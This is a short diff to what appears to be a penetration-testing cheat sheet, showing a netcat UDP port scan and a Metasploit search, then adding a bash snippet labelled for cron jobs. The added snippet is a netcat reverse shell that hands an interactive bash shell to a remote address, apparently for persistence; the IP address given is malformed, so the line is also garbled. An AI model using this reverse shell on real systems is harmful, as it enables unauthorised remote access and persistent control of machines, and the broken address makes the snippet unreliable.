@@ -183,3 +183,7 @@ nc -zuv 10.11.1.226 1-100->port range
 
 Searching in metapsloit with keywords:
 search platform:windows bid:5411
+
+NETCAT for cronjobs:
+#!/bin/bash
+nc -c /bin/bash\ -i 192.168.1129.1119 5555 0>&1
